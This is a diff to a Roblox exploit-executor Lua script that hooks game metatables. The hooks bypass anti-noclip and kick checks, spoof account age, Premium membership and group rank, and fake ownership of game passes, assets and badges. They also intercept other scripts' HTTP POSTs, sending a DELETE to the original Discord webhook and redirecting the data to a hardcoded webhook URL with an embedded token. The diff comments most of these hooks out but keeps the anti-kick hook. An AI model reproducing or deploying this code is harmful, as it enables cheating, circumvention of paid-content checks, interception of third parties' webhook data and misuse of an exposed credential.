@@ -3,7 +3,7 @@ local client = game:GetService"Players".LocalPlayer
 local pages, checkplaceId = game:GetService"AssetService":GetGamePlacesAsync()
 while wait() do
 	for i, place in pairs(pages:GetCurrentPage()) do
-		if table.find({ "5343994291" }, tostring(place.PlaceId)) then checkplaceId = true end
+		if table.find({ "5343994291", "2727067538" }, tostring(place.PlaceId)) then checkplaceId = true end
 	end
 	if pages.IsFinished then break end
 	pages:AdvanceToNextPageAsync()
@@ -15,44 +15,57 @@ client.DevCameraOcclusionMode = "Invisicam"
 client.CameraMaxZoomDistance = 1e4
 if hookfunction and getrawmetatable then
 	pcall(function() setreadonly(getrawmetatable(game), false) end)
-	-- anti noclip bypass
-	local rnd, BypassAnti_Noclip = Random.new():NextInteger(150, 1e5)
-	BypassAnti_Noclip = hookfunction(getrawmetatable(Enum.HumanoidStateType).__index, function(Self, Index)
+	--[[
+		-- anti noclip bypass
+		local rnd, BypassAnti_Noclip = Random.new():NextInteger(150, 1e5)
+		BypassAnti_Noclip = hookfunction(getrawmetatable(Enum.HumanoidStateType).__index, function(Self, Index)
 		if Index == "StrafingNoPhysics" and Self == Enum.HumanoidStateType then return rnd end
 		return BypassAnti_Noclip(Self, Index)
-	end)
-	local synapse, shithttp = syn and syn.request, http and http.request
-	local request = http_request or request or HttpPost or synapse or shithttp
-	anti_webhook = hookfunction(request, function(self)
+		end)
+		local synapse, shithttp = syn and syn.request, http and http.request
+		local request = http_request or request or HttpPost or synapse or shithttp
+		anti_webhook = hookfunction(request, function(self)
 		if self.Url and self.Method == "POST" and self.Url then
-			local abcdef = { Url = self.Url, Method = "DELETE" }
-			request(abcdef)
-			self.Url = "https://discord.com/api/webhooks/869858172796559380/_cWT7d4snqvOi7P4vZRvFt5VgiuN-MeXfddz-W6nSaxxxwqghH_Z_pcWIlblmyZEPWdi3543"
+		local abcdef = { Url = self.Url, Method = "DELETE" }
+		request(abcdef)
+		self.Url = "https://discord.com/api/webhooks/869858172796559380/_cWT7d4snqvOi7P4vZRvFt5VgiuN-MeXfddz-W6nSaxxxwqghH_Z_pcWIlblmyZEPWdi3543"
 		end
 		return anti_webhook(self)
-	end)
-	local acc_spoof
-	acc_spoof = hookfunction(getrawmetatable(client).__index, function(Self, Index)
+		end)
+		local acc_spoof
+		acc_spoof = hookfunction(getrawmetatable(client).__index, function(Self, Index)
 		if Index == "AccountAge" and Self == client then return tonumber"99999"
 		elseif Index == "MembershipType" and Self == client then return Enum.MembershipType.Premium end
 		return acc_spoof(Self, Index)
-	end)
+		end)
+		if not checkplaceId then
+		local _namecall
+		_namecall = hookfunction(getrawmetatable(game).__namecall, function(Self, ...)
+		local method = getnamecallmethod()
+		if method == "IsInGroup" and Self == client then return true
+		elseif method == "GetRankInGroup" and Self == client then return 255
+		elseif method:lower() == "kick" and Self == client and not checkcaller() then
+		-- anti kick
+		return wait(math.huge)
+		elseif table.find({
+		"UserOwnsGamePassAsync",
+		"PlayerOwnsAsset",
+		"PlayerHasPass",
+		"UserHasBadge",
+		"UserHasBadgeAsync"
+		}, method) and Self == client then return true end
+		return _namecall(Self, ...)
+		end)
+		end
+	]]
 	if not checkplaceId then
 		local _namecall
 		_namecall = hookfunction(getrawmetatable(game).__namecall, function(Self, ...)
 			local method = getnamecallmethod()
-			if method == "IsInGroup" and Self == client then return true
-			elseif method == "GetRankInGroup" and Self == client then return 255
-			elseif method:lower() == "kick" and Self == client and not checkcaller() then
+			if not checkcaller() and method:lower() == "kick" and Self == client then
 				-- anti kick
 				return wait(math.huge)
-			elseif table.find({
-				"UserOwnsGamePassAsync",
-				"PlayerOwnsAsset",
-				"PlayerHasPass",
-				"UserHasBadge",
-				"UserHasBadgeAsync"
-			}, method) and Self == client then return true end
+			end
 			return _namecall(Self, ...)
 		end)
 	end
